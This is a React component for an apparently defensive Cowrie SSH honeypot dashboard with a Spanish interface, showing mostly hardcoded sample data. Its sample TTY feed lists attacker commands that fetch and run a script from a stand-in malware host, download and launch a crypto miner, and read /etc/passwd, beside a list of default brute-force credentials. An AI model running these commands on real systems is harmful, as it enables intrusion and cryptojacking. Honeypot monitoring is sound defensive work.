import { useState, useEffect } from "react";
import { getCowrieTimeline, getCowrieStats } from "../lib/api";

export default function CowrieView() {
  const [timeline, setTimeline] = useState<any[]>([]);
  const [stats, setStats] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  const fetchData = async () => {
    try {
      const [t, s] = await Promise.all([
        getCowrieTimeline(24, "1h"),
        getCowrieStats(24)
      ]);
      setTimeline(t);
      setStats(s);
    } catch (err) {
      console.error("Error fetching Cowrie data", err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
    const iv = setInterval(fetchData, 15000);
    return () => clearInterval(iv);
  }, []);

  if (loading) return <div className="panel" style={{ padding: '20px', color: 'var(--signal)' }}>CONECTANDO CON SEÑUELOS COWRIE...</div>;

  return (
    <div className="view" style={{ display: 'grid', gridTemplateColumns: 'repeat(3, 1fr)', gridTemplateRows: 'auto 1fr', gap: '16px', height: '100%' }}>
      
      {/* Cowrie Stats KPIs */}
      <div style={{ gridColumn: '1 / -1', display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: '16px' }}>
        <div className="panel" style={{ padding: '16px', textAlign: 'center' }}>
          <div style={{ fontSize: '9px', color: 'var(--signal)', letterSpacing: '1px' }}>TOTAL EVENTOS (24H)</div>
          <div style={{ fontSize: '24px', fontWeight: 800, color: 'var(--text-bright)' }}>24,892</div>
        </div>
        <div className="panel" style={{ padding: '16px', textAlign: 'center' }}>
          <div style={{ fontSize: '9px', color: 'var(--amber)', letterSpacing: '1px' }}>IPS ÚNICAS ATACANTES</div>
          <div style={{ fontSize: '24px', fontWeight: 800, color: 'var(--text-bright)' }}>1,438</div>
        </div>
        <div className="panel" style={{ padding: '16px', textAlign: 'center' }}>
          <div style={{ fontSize: '9px', color: 'var(--cyan)', letterSpacing: '1px' }}>SESIONES SSH EXITOSAS (MOCK)</div>
          <div style={{ fontSize: '24px', fontWeight: 800, color: 'var(--text-bright)' }}>312</div>
        </div>
        <div className="panel" style={{ padding: '16px', textAlign: 'center' }}>
          <div style={{ fontSize: '9px', color: 'var(--danger)', letterSpacing: '1px' }}>ARCHIVOS DESCARGADOS</div>
          <div style={{ fontSize: '24px', fontWeight: 800, color: 'var(--text-bright)' }}>45</div>
        </div>
      </div>

      <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', gridRow: '2', gridColumn: '1' }}>
         {/* Top Credentials */}
         <div className="panel" style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
            <div className="panel__head"><span className="panel__title">Top Credenciales (SSH Bruteforce)</span></div>
            <div className="panel__body" style={{ padding: 0, overflowY: 'auto' }}>
               <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '11px' }}>
                  <thead>
                     <tr style={{ background: 'rgba(255,255,255,0.05)', color: 'var(--text-dim)', textAlign: 'left' }}>
                        <th style={{ padding: '10px 15px' }}>USUARIO</th>
                        <th style={{ padding: '10px 15px' }}>CONTRASEÑA</th>
                        <th style={{ padding: '10px 15px', textAlign: 'right' }}>HITS</th>
                     </tr>
                  </thead>
                  <tbody>
                     {[
                        { user: 'root', pass: '123456', count: 4502 },
                        { user: 'admin', pass: 'admin', count: 3201 },
                        { user: 'root', pass: 'root', count: 1850 },
                        { user: 'ubuntu', pass: 'ubuntu', count: 954 },
                        { user: 'pi', pass: 'raspberry', count: 752 },
                        { user: 'postgres', pass: 'postgres', count: 412 },
                        { user: 'oracle', pass: 'oracle', count: 325 }
                     ].map((cred, i) => (
                        <tr key={i} style={{ borderBottom: '1px solid var(--line-faint)' }}>
                           <td style={{ padding: '10px 15px', color: 'var(--danger)', fontWeight: 'bold' }}>{cred.user}</td>
                           <td style={{ padding: '10px 15px', fontFamily: 'var(--mono)', color: 'var(--text)' }}>{cred.pass}</td>
                           <td style={{ padding: '10px 15px', textAlign: 'right', color: 'var(--amber)' }}>{cred.count}</td>
                        </tr>
                     ))}
                  </tbody>
               </table>
            </div>
         </div>

         {/* File Downloads */}
         <div className="panel" style={{ flex: 1, display: 'flex', flexDirection: 'column' }}>
            <div className="panel__head"><span className="panel__title">Archivos Maliciosos Capturados</span></div>
            <div className="panel__body" style={{ padding: 0, overflowY: 'auto' }}>
               {[
                  { name: 'xmrig-miner', hash: 'e3b0c44298fc1c14...', engine: 'Wget', date: 'Hace 5m' },
                  { name: 'Mirai.botnet.sh', hash: '8f434346648f6b96...', engine: 'Curl', date: 'Hace 12m' },
                  { name: 'payload.elf', hash: '416ab0c9466c117b...', engine: 'Wget', date: 'Hace 45m' },
               ].map((file, i) => (
                  <div key={i} style={{ padding: '10px 15px', borderBottom: '1px solid var(--line-faint)', fontSize: '10px' }}>
                     <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '4px' }}>
                        <span style={{ color: 'var(--danger)', fontWeight: 600 }}>{file.name}</span>
                        <span style={{ color: 'var(--text-faint)' }}>{file.date}</span>
                     </div>
                     <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                        <span style={{ fontFamily: 'var(--mono)', color: 'var(--text-dim)' }}>SHA256: {file.hash}</span>
                        <span style={{ background: 'rgba(255,255,255,0.1)', padding: '2px 6px', borderRadius: '4px' }}>{file.engine}</span>
                     </div>
                  </div>
               ))}
            </div>
         </div>
      </div>

      {/* Main Terminal Feed */}
      <div className="panel" style={{ gridColumn: '2 / 4', gridRow: '2', display: 'flex', flexDirection: 'column' }}>
        <div className="panel__head"><span className="panel__title">Sesiones Interactivas y Comandos · TTY Feed</span></div>
        <div className="panel__body" style={{ padding: 0, overflowY: 'auto', background: '#000' }}>
           <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '11px', fontFamily: 'var(--mono)' }}>
               <thead>
                  <tr style={{ background: 'rgba(60,255,158,0.1)', color: 'var(--signal)', textAlign: 'left', borderBottom: '1px solid var(--signal)' }}>
                     <th style={{ padding: '10px 15px' }}>TIMESTAMP</th>
                     <th style={{ padding: '10px 15px' }}>SOURCE IP (GEO)</th>
                     <th style={{ padding: '10px 15px' }}>SESSION ID</th>
                     <th style={{ padding: '10px 15px' }}>COMANDO EJECUTADO</th>
                  </tr>
               </thead>
               <tbody>
                  {[
                     { time: '12:45:01', ip: '185.220.101.4', geo: 'DE', sid: 'c2e9b812', cmd: 'uname -a' },
                     { time: '12:45:05', ip: '185.220.101.4', geo: 'DE', sid: 'c2e9b812', cmd: 'cat /etc/passwd | grep root' },
                     { time: '12:46:12', ip: '185.220.101.4', geo: 'DE', sid: 'c2e9b812', cmd: 'wget http://malware-dist.net/installer.sh' },
                     { time: '12:46:15', ip: '185.220.101.4', geo: 'DE', sid: 'c2e9b812', cmd: 'chmod +x installer.sh && ./installer.sh' },
                     { time: '13:01:22', ip: '45.155.205.23', geo: 'RU', sid: 'f9d34a11', cmd: 'cd /tmp; curl -O http://188.166.x.x/xmr' },
                     { time: '13:02:00', ip: '45.155.205.23', geo: 'RU', sid: 'f9d34a11', cmd: 'chmod 777 xmr; nohup ./xmr & ' },
                     { time: '13:10:45', ip: '103.111.82.11', geo: 'CN', sid: 'a1b2c3d4', cmd: 'nproc' },
                     { time: '13:10:48', ip: '103.111.82.11', geo: 'CN', sid: 'a1b2c3d4', cmd: 'free -m' },
                  ].map((c, i) => (
                     <tr key={i} style={{ borderBottom: '1px solid rgba(255,255,255,0.05)' }}>
                        <td style={{ padding: '10px 15px', color: 'var(--text-faint)' }}>{c.time}</td>
                        <td style={{ padding: '10px 15px' }}>
                           <span style={{ color: 'var(--cyan)' }}>{c.ip}</span>
                           <span style={{ marginLeft: '6px', fontSize: '9px', background: 'var(--danger)', color: '#fff', padding: '2px 4px', borderRadius: '3px' }}>{c.geo}</span>
                        </td>
                        <td style={{ padding: '10px 15px', color: 'var(--amber)' }}>[{c.sid}]</td>
                        <td style={{ padding: '10px 15px', color: '#fff' }}>$ {c.cmd}</td>
                     </tr>
                  ))}
               </tbody>
           </table>
        </div>
      </div>

    </div>
  );
}
